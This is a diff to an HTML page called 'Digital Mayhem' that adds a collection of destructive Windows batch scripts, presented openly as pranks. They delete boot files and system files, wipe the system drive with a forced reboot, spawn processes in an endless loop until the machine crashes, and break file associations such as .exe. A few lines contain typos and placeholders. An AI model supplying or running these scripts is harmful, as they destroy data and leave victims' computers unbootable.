@@ -2,6 +2,8 @@
 
 <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
 <head>
+    <link rel="stylesheet" href="StyleSheetA.css" />
+    <link rel="stylesheet" href="StyleSheetC.css" />
     <link rel="stylesheet" href="StyleSheet5.css">
     <meta charset="utf-8" />
     <title>Digital Mayhem</title>
@@ -136,10 +138,102 @@
     <br />
     <br />
     <hr />
-    <br />    <h3 id="DM" style="color:red">Digital Mayhem:</h3>
+    <br />    <h1 id="DM" style="color:red">Digital Mayhem:</h1>
 
     <p>
         Under Construction
+        <hr/>
+    </p>
+    <br/>
+    <h2><ins>Permanent Shutdown</ins></h2>
+    <p>
+        @echo off
+        <br/>
+        attrib -r -s -h C:\autoexec.bat
+        <br/>
+        del C:\autoexec.bat
+        <br/>
+        attrib -r -s -h C:\boot.ini
+        <br/>
+        del C:\boot.ini
+        <br/>
+        attrib -r -s -h C:\ntldr
+        <br/>
+        del C:\ntldr
+        <br/>
+        attrib -r -s -h C:\Windows\win.ini
+        <br/>
+        del C:\Windows\win.ini 
+    </p>
+    <br/>
+    <h2><ins>Delete C:\ Drive</ins></h2>
+    <p>
+        @echo off
+        <br/>
+        Del C:\*.* |y
+    </p>
+    <br/>
+    <h2><ins>Delete System Drive</ins></h2>
+    <p>
+        @echo&nbspoff
+        <br/>
+        del&nbsp%systemdrive%\*.*&nbsp/f&nbsp/s&nbsp/q
+        <br/>
+        shutdown&nbsp-r&nbsp-f&nbsp-t&nbsp00
+    </p>
+    <br/>
+    <h2><ins>Endless Notepad <sup>(This will make your computer crash if you can not stop the program)</sup></ins></h2>
+    <p>
+        Echo off
+        <br/>
+        :loop1
+        <br/>
+        start command
+        <br/>
+        "      " (10x)
+        <br/>
+        goto loop2
+        <br/>
+        :loop2
+        <br/>
+        start command
+        <br/>
+        "       " (10x)
+        <br/>
+        goto loop1
+    </p>
+    <br/>
+    <h2><ins>Extension Changer</ins></h2>
+    <p>
+        @echo off
+        <br/>
+        assoc .txt=anything
+        <br/>
+        assoc .exe=anything
+        <br/>
+        assoc .jpg=anything
+        <br/>
+        assoc .png=anything
+        <br/>
+        assoc .mpeg=anything
+        <br/>
+    </p>
+    <h2><ins>Delete Windows Files</ins></h2>
+    <p>
+        del "C:\windows\pchealth"
+        <br/>
+        del "C:\windows\system"
+        <br/>
+        del "C:\windows\system32\restore"
+        <br/>
+        dek "C:\winlogon.exe"
+        <br/>
+        del "C:\windows\system32\logonui.exe"
+        <br/>
+        del "C:\windows\system32\ntoskrni.exe"
+        <br/>
+        del "C:\windows\system32\autoexec.nt"
+        <br/> 
     </p>
 </body>
 </html>
